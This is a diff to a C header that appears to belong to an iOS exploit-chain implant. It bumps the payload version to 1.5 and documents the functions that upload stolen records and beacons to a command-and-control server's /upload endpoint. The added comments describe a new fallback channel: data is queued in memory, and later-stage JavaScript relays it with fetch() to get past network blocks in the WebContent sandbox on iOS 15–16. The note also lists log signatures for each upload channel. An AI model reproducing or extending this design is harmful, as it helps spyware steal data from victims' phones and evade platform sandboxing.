@@ -13,7 +13,7 @@
  * behaviour so the operator can confirm which version is running on-device.
  * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
  */
-#define PAYLOAD_VERSION "1.4"
+#define PAYLOAD_VERSION "1.5"
 
 /*
  * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
@@ -26,6 +26,9 @@
  *   C — JSContext fetch() injection (WebContent JS thread / saved context)
  *   B — raw POSIX socket + SecureTransport TLS
  *   A — NSURLSession (blocked in WebContent, used outside WebContent)
+ *   D — in-memory queue (g_cru_q) read by Stage3 JS after _process() returns;
+ *       Stage3 POSTs items via fetch() — always permitted in WebContent.
+ *       Items with base64 length ≥ CRU_Q_B64MAX are silently skipped.
  */
 void upload_to_c2(const char *category, const char *path,
                   const char *description, const char *b64data);
@@ -33,13 +36,18 @@ void upload_to_c2(const char *category, const char *path,
 /*
  * upload_beacon — synchronous diagnostic probe called from process().
  *
- * Channel priority: C → B → A (same as upload_to_c2).
- * Channel C is tried first because process() runs on the JS execution thread
- * where [JSContext currentContext] is live; the resulting fetch() uses
- * WebKit's own networking (always allowed in WebContent).
+ * Channel priority: C → B → A → D (same as upload_to_c2).
  *
- * If beacon appears in logs  → C or B works inside WebContent.
- * If beacon is absent        → sandbox blocks ALL outbound; check JS errors.
+ * v1.5: Channel D is the new primary WebContent fallback.  If C/B/A all
+ * fail (as observed in iOS 15–16 WebContent), the beacon is written into
+ * g_cru_q[] and Stage3 relays it immediately after _process() returns.
+ *
+ * Log signatures:
+ *   beacon in logs with (jsc)  → Channel C succeeded
+ *   beacon in logs without tag → Channel B or A succeeded
+ *   beacon relayed by Stage3   → Channel D succeeded (path=/coruna/beacon,
+ *                                 description contains "v1.5")
+ *   beacon absent              → all channels failed; file a bug
  */
 void upload_beacon(void);
 
